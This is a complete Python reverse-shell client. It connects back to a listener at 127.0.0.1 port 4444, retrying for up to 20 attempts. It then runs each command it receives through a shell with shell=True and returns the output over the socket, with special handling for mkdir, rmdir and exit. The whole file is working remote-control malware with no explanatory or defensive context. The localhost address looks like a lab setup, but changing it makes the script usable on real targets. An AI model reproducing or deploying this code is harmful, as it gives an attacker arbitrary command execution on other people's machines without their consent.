import socket
import subprocess
import time
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "127.0.0.1"
port = 4444

for i in range(20):
    try:
        s.connect((host, port))
        break
    except:
        time.sleep(5)

while True:
    data = s.recv(99999)
    if data != b'':
        data = str(data, "utf-8")

        if data == "exit":
            break

        if data.startswith("mkdir"):
            command, directory = data.split(" ")
            try:
                os.mkdir(directory)
                output = f"Directory '{directory}' created successfully"
            except Exception as e:
                output = f"Failed to create directory '{directory}': {str(e)}"
            s.send(output.encode())
        elif data.startswith("rmdir"):
            command, directory = data.split(" ")
            try:
                os.rmdir(directory)
                output = f"Directory '{directory}' removed successfully"
            except Exception as e:
                output = f"Failed to remove directory '{directory}': {str(e)}"
            s.send(output.encode())
        
        else:
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = proc.stdout.read() + proc.stderr.read()
            s.send(output)
    else:
        break

s.close()
